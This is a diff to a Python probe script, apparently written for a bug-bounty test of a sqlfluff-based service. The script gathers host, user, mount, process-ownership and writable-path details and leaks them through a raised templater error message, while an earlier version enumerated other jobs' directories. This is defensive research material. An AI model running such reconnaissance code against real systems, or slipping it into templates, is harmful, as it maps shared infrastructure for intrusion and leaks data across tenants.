@@ -1,11 +1,18 @@
 MARKER = 'A145F9_NEGCTL_1B2047C13A46'
-"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1).
-Reads process-local directory NAMES, and the content of ONE file whose
-name this researcher chose and planted. No environment, no network, no
-instance metadata, no foreign file content."""
+
+def _safe_uid(p):
+    try:
+        return os.stat(p).st_uid
+    except Exception:
+        return -1
+"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1, safe harbour).
+Reads process-local directory NAMES, and the content of files whose names
+this researcher chose and planted. No environment variables, no network,
+no instance metadata, no credentials, no foreign file content."""
 import json, os, time
 from sqlfluff.core.errors import SQLTemplaterError
 CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
+HOLD = 150
 out = {}
 
 def _mine():
@@ -13,39 +20,48 @@ def _mine():
     return parts[-2] if len(parts) >= 2 else ''
 
 try:
-    out["cwd"] = os.getcwd()
-    mine = _mine()
-    out["mine_len"] = len(mine)
+    out["host"] = __import__("socket").gethostname()
     out["uid"] = os.getuid()
     out["gid"] = os.getgid()
-    out["host"] = __import__("socket").gethostname()
-    base = "/tmp/jobs"
     now = time.time()
-    es = sorted(os.listdir(base))
-    out["n_entries"] = len(es)
-    out["own_present"] = mine in es
-    others = [e for e in es if e != mine]
-    out["n_other"] = len(others)
-    out["all_digit"] = all(e.isdigit() for e in es)
-    out["name_lens"] = sorted(set(len(e) for e in es))
-    rows = []
-    for e in others:
-        p = base + "/" + e
+    for lbl, path in (("root", "/"), ("tmp", "/tmp"), ("jobs", "/tmp/jobs")):
         try:
-            age = int(now - os.stat(p).st_mtime)
-        except Exception:
-            age = -1
-        rows.append([age,
-                     1 if os.access(p, os.R_OK | os.X_OK) else 0,
-                     1 if os.path.isdir(p + "/target") else 0])
-    rows.sort()
-    out["rows_age_readable_hastarget"] = rows[:45]
-    out["n_other_readable"] = sum(1 for r in rows if r[1])
-    out["n_other_with_target"] = sum(1 for r in rows if r[2])
+            s = os.stat(path)
+            out["id_" + lbl] = [s.st_dev, s.st_ino, int(now - s.st_mtime)]
+        except Exception as exc:
+            out["id_" + lbl] = "ERR:" + type(exc).__name__
     try:
-        out["own_age"] = int(now - os.stat(base + "/" + mine).st_mtime)
+        mts = []
+        with open("/proc/self/mountinfo") as fh:
+            for ln in fh:
+                f = ln.split()
+                try:
+                    sep = f.index("-")
+                    mts.append([f[4], f[sep + 1]])
+                except Exception:
+                    continue
+        out["n_mounts"] = len(mts)
+        out["mount_points"] = sorted(set(m[0] for m in mts))[:30]
+    except Exception as exc:
+        out["mounts_err"] = type(exc).__name__
+    try:
+        me = os.getuid()
+        pids = [e for e in os.listdir("/proc") if e.isdigit()]
+        mine_n = sum(1 for p in pids if _safe_uid("/proc/" + p) == me)
+        out["n_pids"] = len(pids)
+        out["n_pids_own_uid"] = mine_n
+        out["n_pids_other_uid"] = len(pids) - mine_n
+    except Exception as exc:
+        out["proc_err"] = type(exc).__name__
+    probe = ["/", "/tmp", "/tmp/jobs", "/etc", "/venv", "/usr/lib", "/home"]
+    try:
+        import sqlfluff as _sf
+        probe.append(os.path.dirname(_sf.__file__))
+        out["sqlfluff"] = getattr(_sf, "__version__", "?")
     except Exception:
-        out["own_age"] = -1
+        pass
+    out["w_ok"] = [[q[-44:], 1 if os.access(q, os.W_OK) else 0,
+                    1 if os.path.isdir(q) else 0] for q in probe]
 except Exception as exc:
     out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
 raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
